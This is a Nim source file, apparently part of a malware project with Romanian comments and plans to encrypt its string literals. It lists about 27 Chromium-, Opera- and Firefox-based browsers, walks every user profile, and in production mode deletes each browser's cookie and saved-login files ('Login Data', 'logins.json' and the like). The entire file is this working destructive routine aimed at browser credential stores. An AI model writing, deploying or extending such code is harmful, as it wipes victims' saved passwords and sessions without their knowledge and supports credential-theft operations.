## THIS THREAD MIGHT NEED OPTIMIZATIONS 
## BECAUSE OF THE CONSTANT ENCRYPTING AND DECRYPTING
## OF STRING LITERALS
## TODO: HAVE A LOOK AT THIS AND TEST

from os import `/`
from os import getEnv
from os import walkDir
from os import PathComponent # pcDir
from os import existsDir
from os import existsFile

from strutils import startsWith

from ../constants import isProd

when isProd:
  from ../functions/removeFile import removeFileOrSleep

type
  BROWSER_TYPES = enum
    CHROME_BASED
    OPERA_BASED # still CHROME_BASED but uses a slightly different file structure
    FIREFOX_BASED
  browserType = tuple[based: BROWSER_TYPES, folders: seq[string]]
  browserThreadArgs = tuple[
    based: BROWSER_TYPES,
    folder: string,
    appdata: string,
    localappdata: string
  ]
  browserThreadType = Thread[browserThreadArgs]

# mai bn array decat seq ca ii mai performant asa
const browsers: array[3, browserType] = [
  (
    CHROME_BASED,
    @[
      "Google\\Chrome",
      "Microsoft\\Edge",
      "7Star\\7Star",
      "Amigo",
      "BraveSoftware\\Brave-Browser",
      "CentBrowser",
      "Chedot",
      "Google\\Chrome SxS",
      "Chromium",
      "CocCoc\\Browser",
      "Comodo\\Dragon",
      "Elements Browser",
      "Epic Privacy Browser",
      "Kometa",
      "Orbitum",
      "Sputnik\\Sputnik",
      "Torch",
      "uCozMedia\\Uran",
      "Vivaldi",
      "Yandex\\YandexBrowse"
    ]
  ),
  (
    OPERA_BASED,
    @[
      "Opera Software\\Opera Stable"
    ]
  ),
  (
    FIREFOX_BASED,
    @[
      "Mozilla\\Firefox\\Profiles",
      "NETGATE Technologies\\BlackHawk",
      "8pecxstudios\\Cyberfox",
      "Comodo\\IceDragon",
      "K-Meleon,",
      "Mozilla\\icecat"
    ]
  ),
]

proc getNoOfThreads(): int =
  for b in browsers:
    for f in b.folders:
      result += 1

const noOfThreads: int = getNoOfThreads()

proc initSearchThread(args: browserThreadArgs): void {.thread.} =
  let (based, folder, appdata, localappdata) = args

  var
    fullFolder: string = ""
    files: seq[string] = @[]

  case based
  of CHROME_BASED, OPERA_BASED:
    let isOpera: bool = based == OPERA_BASED

    fullFolder =
      if isOpera:
        appdata / folder
      else:
        localappdata / folder / "User Data"

    if existsDir(fullFolder):
      # add default user data
      files.add "Default\\Cookies"
      files.add "Default\\Login Data"

      for kind, maybeProfile in walkDir(fullFolder, true):
        if kind == pcDir:
          # if maybeProfile is a profile
          if maybeProfile.startsWith("Profile"):
            # maybeProfile is now for sure a profile
            files.add maybeProfile / "Cookies"
            files.add maybeProfile / "Login Data"

  of FIREFOX_BASED:
    fullFolder = appdata / folder

    if existsDir(fullFolder):
      for kind, profile in walkDir(fullFolder, true):
        if kind == pcDir:
          files.add profile / "cookies.sqlite"
          files.add profile / "logins.json"

  for file in files:
    let fullPath: string = fullFolder / file

    if existsFile(fullPath):
      # daca nu e production atunci doar fa echo
      when isProd:
        removeFileOrSleep(fullPath)
      else:
        echo fullPath


proc initBrowserThread*(): void {.thread.} =
  let
    appdata: string = getEnv("appdata")
    localappdata: string = getEnv("localappdata")

  var
    threads: seq[browserThreadType] = newSeq[browserThreadType](noOfThreads)
    i = 0
  for browser in browsers:
    for folder in browser.folders:
      createThread(
        threads[i],
        initSearchThread,
        (
          browser.based,
          folder, # decrypt folder
          appdata,
          localappdata
        )
      )
      i += 1

  joinThreads(threads)

# initBrowserThread()
